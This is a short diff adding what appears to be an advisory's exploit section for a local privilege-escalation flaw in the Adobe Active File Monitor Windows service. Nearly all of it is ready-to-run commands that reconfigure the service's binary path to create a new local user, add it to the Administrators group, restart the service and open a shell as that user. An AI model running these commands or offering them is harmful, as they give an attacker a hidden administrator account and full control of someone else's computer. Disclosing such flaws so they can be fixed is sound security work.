@@ -1,0 +1,8 @@
+To exploit this issue, attackers require local, interactive access to an affected computer.
+
+The following example commands are available:
+
+sc stop "AdobeActiveFileMonitor8.0"
+sc config "AdobeActiveFileMonitor8.0" binPath= "cmd /c net user adobe kills /add && net localgroup Administrators adobe /add"
+sc start "AdobeActiveFileMonitor8.0"
+runas /noprofile /user:%COMPUTERNAME%\adobe cmd
